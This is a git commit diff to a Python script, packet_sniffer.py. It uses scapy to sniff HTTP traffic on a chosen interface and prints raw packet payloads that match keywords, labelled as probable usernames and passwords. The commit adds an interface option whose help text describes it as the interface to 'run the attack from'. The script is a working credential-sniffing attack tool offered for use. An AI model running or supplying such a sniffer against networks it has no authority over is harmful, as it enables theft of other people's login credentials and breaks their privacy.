89040f7bbf1db6f1e6f6a2187e97b9f238881f3d
Bisasterboy <mohamadbr22@gmail.com>
2019-12-31 16:14:16 -0500

    c3

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -1,6 +1,21 @@
 import scapy.all as scapy
 from scapy.layers import http
 
+from optparse import OptionParser
+
+def get_args():
+    parse = OptionParser()
+    parse.add_option(
+        "-i",
+        "--interface",
+        dest="interface",
+        help="Provide the interface you want to run the attack from"
+    )
+    ( options ,args ) = parse.parse_args()
+    if not options.interface:
+        parse.error("Provide the params please ,type --help for more info")
+    return options
+
 def sniff(interface):
     scapy.sniff(iface=interface ,prn=analyse_packets)
 
@@ -15,7 +30,9 @@ def analyse_packets(packet):
             "email","name"]
             for keyword in keywords:
                 if keyword in packet[scapy.Raw].load:
-                    print("userful info : " , packet[scapy.Raw].load)
+                    print("*************************\n\n")
+                    print("userful info probibility of [username , password]: " , packet[scapy.Raw].load)
+                    print("\n\n*************************")
                     break
 
-sniff("eth0")
+sniff(get_args().interface)
